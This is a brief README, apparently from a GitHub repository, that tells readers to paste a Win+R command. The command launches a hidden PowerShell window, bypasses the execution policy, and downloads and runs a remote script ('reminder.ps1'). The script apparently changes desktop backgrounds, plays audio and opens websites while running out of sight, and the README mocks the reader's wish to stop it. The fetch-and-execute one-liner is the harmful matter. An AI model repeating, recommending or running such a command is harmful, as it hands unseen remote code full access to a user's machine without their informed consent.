## Run the program instantly from any computer

No installation or prerequisites are needed. The program runs in the background. To stop the program, not that I could ever imagine you would want to do such a thing, restart the device or end the PowerShell process in Task Manager.

### Setup

Press **Win + R**, paste the command below, and press Enter:

```
conhost.exe --headless powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminder.ps1 | iex"
```

## Disclaimer

This program, along with the desktop backgrounds, audio files, and website directory included in the `.ps1` script, while curated by the author of this repository, [Kiyan-7](https://github.com/Kiyan-7), are not the intellectual property of nor copyright/trademark holding state of the author. [Kiyan-7](https://github.com/Kiyan-7) permits for you to do as you wish with the program.

> "We have the watch, and I'll see you in Valhalla"
